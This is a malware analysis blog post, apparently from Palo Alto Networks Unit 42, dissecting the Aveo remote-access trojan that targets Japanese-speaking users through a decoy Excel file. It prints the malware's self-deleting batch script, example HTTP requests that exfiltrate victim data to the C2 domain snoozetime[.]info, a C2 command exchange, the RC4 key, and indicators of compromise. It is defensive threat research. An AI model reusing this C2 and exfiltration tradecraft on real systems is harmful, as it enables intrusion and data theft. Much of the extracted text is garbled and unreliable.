Figure 
2 
Decoy 
document 
used 
with 
Aveo 
malware 


GetUpdatesSignuptoreceivethelatestnews,cyberthreatintelligenceandresearchfromUnit42.
BusinessEmailSearchSubmitSelectaCategorySelectaMonthTweet1POSTEDBY:JoshGrunzweigandRobertFalconeonAugust16,201611:00PMFILEDIN:Malware,ThreatPrevention,Unit42TAGGED:Aveo,FormerFirstRAT,IdoLaboratory,microsoft,snoozetimePaloAltoNetworkshasidentifiedamalwarefamilyknownas‘Aveo’thatisbeingusedtotargetJapanesespeakingusers.The‘Aveo’malwarenamecomesfromanembeddeddebugstringwithinthebinaryfile.TheAveomalwarefamilyhasclosetiestothepreviouslydiscussedFormerFirstRATmalwarefamily,whichwasalsowitnessedbeingusedagainstJapanesetargets.AveoisdisguisedasaMicrosoftExceldocument,anddropsadecoydocumentuponexecution.ThedecoydocumentinquestionisrelatedtoaresearchinitiativeledbytheIdoLaboratoryattheSaitamaInstituteofTechnology.Uponexecution,theAveomalwareacceptsanumberofcommands,allowingattackerstotakefullcontroloverthevictimmachine.
TheAveomalwaresampledisguisesitselfasaMicrosoftExceldocument,astheiconbelowdemonstrates.Notethatthefilenameof‘malware.exe’issimplyaplaceholder,astheoriginalfilenameisunknown.
Figure1MicrosoftExceliconusedbyAveomalwareTheexecutableisinfactaWinRARself-extractingexecutablefile,whichwilldropthedecoydocumentandAveoTrojanuponexecution.Thefollowingdecoydocumentisdroppedandsubsequentlyopenedwhenrun.
7LikeLikeEnglish1.866.320.4788SupportResourcesResearch
MORE→
People 
of 
Palo 
Alto 
Networks:
Dimitris 
Patsalas 


posted 
by 
Justin 
Hall 
onAugust 
17, 
2016 


Aveo 
Malware 
Family 
TargetsJapanese 
Speaking 
Users 


posted 
by 
Josh 
Grunzweig 
onAugust 
16, 
2016 


Unit 
42 
Researchers 
Recognized 
inMSRC 
Top 
100 
List 


posted 
by 
Ryan 
Olson 
onAugust 
16, 
2016 


Content 
That 
Respects 
the 
Value 
ofYour 
Time 


posted 
by 
Scott 
Ciccone 
onAugust 
15, 
2016 


Palo 
Alto 
Networks 
News 
of 
the 
Week 
– 
August 
13, 
2016 


posted 
by 
Anna 
Lough 
onAugust 
13, 
2016 


MORE→

This 
decoy 
document 
is 
hosted 
on 
the 
Ido 
Laboratory 
and 
contains 
information 
about 
a 
2016 
research 
initiative. 
The 
document 
lists 
participants 
in 
the 
16th 
CAVE 
workshop, 
including 
names, 
affiliations, 
and 
email 
addresses 
of 
those 
involved. 
The 
document, 
written 
in 
Japanese, 
as 
well 
as 
the 
filename 
of 
this 
document, 
“CAVE研究会参加者.xls”, 
indicates 
that 
this 
malware 


was 
used 
to 
target 
one 
or 
more 
Japanese 
speaking 
individuals. 
Additionally, 
the 
similarities 
between 
theAveo 
and 
FormerFirstRAT 
malware 
families, 
which 
will 
be 
discussed 
later 
in 
the 
post, 
further 
add 
evidence 
that 
Japanese 
speakers 
are 
being 
targeted. 


TheAveo 
Trojan 
is 
configured 
to 
communicate 
with 
the 
following 
domain 
name 
over 
HTTP. 



snoozetime[.]info 


This 
domain 
was 
first 
registered 
in 
May 
2015 
to 
‘jack.ondo@mail.com’. 
Since 
that 
time, 
it 
has 
since 
been 
associated 
with 
the 
following 
three 
IP 
addresses: 



104.202.173[.]82 



107.180.36[.]179 



50.63.202[.]38 


All 
IP 
addresses 
in 
question 
are 
located 
within 
the 
United 
States. 



Figure 
3 
PassiveTotal 
screenshot 
showing 
associated 
IP 
addresses 
with 
snoozetime[.]info 


The 
WHOIS 
information 
for 
snoozetime[.]info 
lists 
a 
registrant 
email 
address 
of 
‘jack.ondo@mail[.]com’ 
and 
a 
name 
of 
‘aygt5ruhrj 
aygt5ruhrj 
gerhjrt’. 
Pivoting 
off 
of 
these 
two 
pieces 
of 
information 
to 
domains 
that 
share 
the 
same 
yields 
the 
following 
additional 
domains 
and 
email 
addresses. 



bluepaint[.]info 
coinpack[.]info 
7b7p[.]info 
donkeyhaws[.]info 
europcubit[.]com 
jhmiyh.ny@gmail[.]com 
844148030@qq[.]com 



After 
running 
the 
self-extracting 
executable, 
a 
number 
of 
files 
are 
dropped 
to 
the 
file 
system 
and 
the 
following 
execution 
flow 
is 
witnessed: 



Figure 
4 
Malware 
execution 
flow 


When 
the 
mshelp32.exe 
executable 
runs, 
it 
begins 
by 
reading 
in 
the 
setting32.ini 
file, 
which 
contains 
the 
name 
of 
the 
decoy 
document. 
This 
information 
is 
used 
to 
build 
a 
batch 
script, 
such 
as 
the 
following. 



1234567@echooffcopy"CAVE研究会参加者.xls""C:\DocumentsandSettings\Administrator\Ddel"CAVE研究会参加者.xls"/F/Qdelmshelp32.exe/F/Qdelsetting32.ini/F/Qdel"C:\DocumentsandSettings\Administrator\Desktop\8101c298a33d91adel%0/F/Q1234567@echooffcopy"CAVE研究会参加者.xls""C:\DocumentsandSettings\Administrator\Ddel"CAVE研究会参加者.xls"/F/Qdelmshelp32.exe/F/Qdelsetting32.ini/F/Qdel"C:\DocumentsandSettings\Administrator\Desktop\8101c298a33d91adel%0/F/Q
This 
batch 
script 
is 
executed 
within 
a 
new 
process, 
and 
acts 
as 
a 
simple 
cleanup 
script 
that 
runs 
afterAveo 
and 
the 
decoy 
document 
are 
executed. 


TheAveo 
malware 
initially 
runs 
an 
install 
routine, 
which 
will 
copy 
itself 
to 
the 
following 
location: 



%APPDATA%\MMC\MMC.exe 


If 
for 
any 
reason 
the 
%APPDATA%\MMC 
directory 
is 
unable 
to 
be 
created,Aveo 
will 
use 
%TEMP% 
instead 
of 
%APPDATA%. 


After 
the 
malware 
copies 
itself, 
it 
will 
execute 
MMC.exe 
in 
a 
new 
process 
with 
an 
argument 
of 
the 
original 
filename. 
When 
executed, 
if 
this 
single 
argument 
is 
provided, 
the 
malware 
will 
delete 
the 
file 
path 
provided. 


After 
the 
installation 
routine 
completes,Aveo 
will 
exfiltrate 
the 
following 
victim 
information 
to 
a 
remote 
server 
via 
HTTP. 



Unique 
victim 
hash 
IPAddress 
Microsoft 
Windows 
version 
Username 
ANSI 
code 
page 
identifier 
This 
information 
is 
exfiltrated 
to 
the 
‘snoozetime[.]info’ 
domain, 
as 
seen 
in 
the 
following 
example 
HTTP 
request: 


1 
GET 
/index.php?id=35467&1=ySxlp03YGm0-&2=yiFi6hjbFHf9UtL44RPQ&4=zTZh 
2 
Accept: 
*/* 
3 
User-Agent: 
Mozilla/4.0 
(compatible; 
MSIE 
6.0; 
Windows 
NT 
5.0; 
.NET 
4 
Host: 
snoozetime[.]info 
5 
Cache-Control: 
no-cache 


To 
encrypt 
the 
provided 
data, 
the 
malware 
makes 
use 
of 
the 
RC4 
algorithm, 
using 
a 
key 
of 
‘hello’.As 
shown 
in 
the 
following 
image, 
the 
encryption 
routines 
betweenAveo 
and 
FormerFirstRAT 
are 
almost 
identical, 
with 
only 
the 
algorithms 
and 
keys 
being 
changed. 



Figure 
5 
Comparison 
of 
encryption 
function 
between 
Aveo 
and 
FormerFirstRAT 


In 
order 
to 
decrypt 
the 
data 
provided 
via 
HTTP, 
the 
following 
code 
may 
be 
used: 


12345678910111213141516171819importbase64frombinasciiimport*
fromstructimport*
fromwincryptoimportCryptCreateHash,CryptHashData,CryptDeriveKeCALG_RC4=0x6801CALG_MD5=0x8003defdecrypt(data):
md5_hasher=CryptCreateHash(CALG_MD5)
CryptHashData(md5_hasher,'hello')
generated_key=CryptDeriveKey(md5_hasher,CALG_RC4)
decrypted_data=CryptDecrypt(generated_key,data)
returndecrypted_dataforain'index.php?id=35467&1=niBo9x/bFG4-&2=yi9i6hjbAmD5TNPu5A--&
k,v=a.split("=")
decrypted=decrypt(base64.b64decode(v.replace("-","=")))
print"[+]Parameter{}Decrypted:{}".format(k,decrypted)
Running 
the 
code 
above 
yields 
the 
following 
results: 



1 
[+] 
Parameter 
1 
Decrypted: 
e8836687 
2 
[+] 
Parameter 
2 
Decrypted: 
172.16.95.184 
3 
[+] 
Parameter 
4 
Decrypted: 
6.1.7601.2.1 
4 
[+] 
Parameter 
5 
Decrypted: 
Josh 
Grunzweig 
5 
[+] 
Parameter 
6 
Decrypted: 
1252 


After 
the 
initial 
victim 
information 
is 
exfiltrated, 
the 
malware 
expects 
a 
response 
of 
‘OK’. 
Afterwards,Aveo 
will 
spawn 
a 
new 
thread 
that 
is 
responsible 
for 
handling 
interactive 
command 
requests 
received 
by 
the 
command 
and 
control 
(C2) 
server, 
as 
well 
as 
requests 
to 
spawn 
an 
interactive 
shell. 


Aveo 
proceeds 
to 
set 
the 
following 
registry 
key 
to 
point 
towards 
the 
malware’s 
path, 
thus 
ensuring 
persistence 
across 
reboots: 


HKCU\software\microsoft\windows\currentversion\run\msnetbridge 


Acommand 
handler 
loop 
is 
then 
entered, 
whereAveo 
will 
accept 
commands 
from 
the 
remote 
C2. 
While 
theAveo 
malware 
family 
awaits 
a 
response, 
it 
will 
perform 
sleep 
delays 
of 
randomly 
chosen 
intervals 
between 
0 
and 
3276 
milliseconds. 
Should 
the 
C2 
server 
respond 
with 
‘toyota’, 
it 
will 
set 
that 
interval 
to 
60 
seconds. 
Aveo 
accepts 
the 
following 
commands, 
shown 
with 
their 
associated 
function. 



1 
: 
Execute 
command 
in 
interactive 
shell 
2 
: 
Get 
file 
attributes 
3 
: 
Write 
file 
4 
: 
Read 
file 
5 
: 
List 
drives 
6 
: 
Execute 
DIR 
command 
against 
path 
The 
following 
example 
request 
demonstrates 
the 
C2 
server 
sending 
the 
‘ipconfig’ 
command 
to 
theAveo 
malware. 


C2 
Request 


12345678910111213141516GET/index.php?id=35468&1=niBo9x/bFG4-HTTP/1.1Accept:*/*
User-Agent:Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.0;.NETHost:snoozetime[.]infoCache-Control:no-cacheHTTP/1.0200OKContent-Type:text/html;charset=utf-8Content-Length:11Server:Werkzeug/0.11.10Python/2.7.5Date:Wed,10Aug201616:00:11GMT\xca89\xb4J\x82B?\xa5\x05\xe8[Decrypted]
1ipconfig
Aveo 
Response 


123456789101112131415161718192021POST/index.php?id=35469&1=niBo9x/bFG4-HTTP/1.1Accept:*/*
User-Agent:Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.0;.NETHost:snoozetime[.]infoContent-Length:1006Cache-Control:no-cache\xca\x38\x39\xb4\x4a\x82\x42\x3f\xa5\x05\xe8\xdb\xda\x74\x8b\x79\x3[Truncated]
[Decrypted]
1ipconfigWindowsIPConfigurationEthernetadapterBluetoothNetworkConnection:
MediaState...........:MediadisconnectedConnection-specificDNSSuffix.:
[Truncated]
Aveo 
shares 
a 
number 
of 
characteristics 
with 
FormerFirstRAT, 
including 
encryption 
routines, 
code 
reuse, 
and 
similarities 
in 
C2 
functionality.Aveo 
is 
far 
from 
the 
most 
sophisticated 
malware 
family 
around.As 
witnessed 
in 
the 
previously 
discussed 
FormerFirstRAT 
sample, 
this 
related 
malware 
family 
also 
looks 
to 
be 
targeting 
Japanese 
speaking 
users. 
Using 
a 
self-extracting 
WinRAR 
file, 
the 
malware 
drops 
a 
decoy 
document, 
a 
copy 
of 
theAveo 
malware, 
and 
a 
cleanup 
script. 


PaloAlto 
Networks 
customers 
are 
protected 
from 
this 
threat 
in 
the 
following 
ways: 



AnAutoFocus 
tag 
has 
been 
created 
to 
track 
and 
monitor 
this 
threat 
WildFire 
classifiesAveo 
samples 
as 
malicious 
C2 
domains 
listed 
in 
this 
report 
are 
blocked 
through 
Threat 
Prevention. 
SHA256 
Hashes 


9dccfdd2a503ef8614189225bbbac11ee6027590c577afcaada7e042e18625e2 
8101c298a33d91a985a5150d0254cf426601e4632250f5a03ddac39375e7fb4d 


C2 
Domains 


snoozetime[.]info 


Registry 
Keys 


HKCU\software\microsoft\windows\currentversion\run\msnetbridge 


File 
Paths 


%APPDATA%\MMC\MMC.exe 
%TEMP%\MMC\MMC.exe 



Name*
Email*
WebsitePostComment
PrivacyPolicyLegalNoticesSiteIndexSubscriptionsCopyright©2007-2013PaloAltoNetworks

